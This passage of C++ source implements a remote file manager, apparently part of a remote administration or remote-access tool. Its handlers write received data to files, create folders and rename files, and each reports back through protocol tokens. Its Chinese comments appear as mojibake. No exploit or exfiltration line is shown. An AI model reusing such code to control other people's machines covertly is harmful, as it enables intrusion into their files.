	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0;
		// д���ļ�
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
 	if (nRet <= 0)
 		OutputDebugString("�ļ�д��ʧ��");
	CloseHandle(hFile);
	// Ϊ�˱Ƚϣ�����������


	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));

	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + _tcslen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

